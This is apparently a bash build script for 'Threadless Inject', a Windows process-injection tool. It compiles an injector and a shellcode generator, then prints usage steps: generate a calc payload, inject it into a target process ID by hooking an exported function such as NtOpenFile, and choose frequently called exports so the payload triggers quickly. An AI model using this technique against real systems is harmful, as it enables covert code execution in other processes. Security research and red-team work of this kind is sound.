#!/bin/bash

# ========================================
# Threadless Inject - Build Script
# ========================================

echo "========================================"
echo "Building Threadless Inject"
echo "========================================"
echo

# 创建输出目录
mkdir -p build

echo "[*] Compiling Threadless Inject..."
echo

gcc -O2 -o build/threadless_inject.exe src/threadless_inject.c -lpsapi
if [ $? -ne 0 ]; then
    echo "[!] Failed to compile threadless_inject.exe"
    exit 1
fi

echo "[+] threadless_inject.exe compiled successfully"
echo

echo "[*] Compiling Shellcode Generator..."
echo

gcc -O2 -o build/generate_shellcode.exe src/generate_shellcode.c
if [ $? -ne 0 ]; then
    echo "[!] Failed to compile generate_shellcode.exe"
    exit 1
fi

echo "[+] generate_shellcode.exe compiled successfully"
echo

echo "========================================"
echo "Build Complete!"
echo "========================================"
echo
echo "Output files:"
echo "  - build/threadless_inject.exe"
echo "  - build/generate_shellcode.exe"
echo
echo "Usage:"
echo "  1. Generate shellcode:"
echo "     build/generate_shellcode.exe calc payload.bin"
echo
echo "  2. Inject to target process:"
echo "     build/threadless_inject.exe <PID> ntdll.dll NtOpenFile payload.bin"
echo
echo "Example:"
echo "  build/generate_shellcode.exe calc payload.bin"
echo "  build/threadless_inject.exe 1234 ntdll.dll NtOpenFile payload.bin"
echo
echo "Recommended export functions:"
echo "  - ntdll.dll: NtOpenFile, NtCreateFile, NtReadFile"
echo "  - kernel32.dll: CreateFileW, ReadFile, WriteFile"
echo
echo "⚠️  Warning:"
echo "  - Target DLL must be loaded in the target process"
echo "  - Choose frequently called functions for quick trigger"
echo "  - Use Process Monitor to observe function calls"
echo
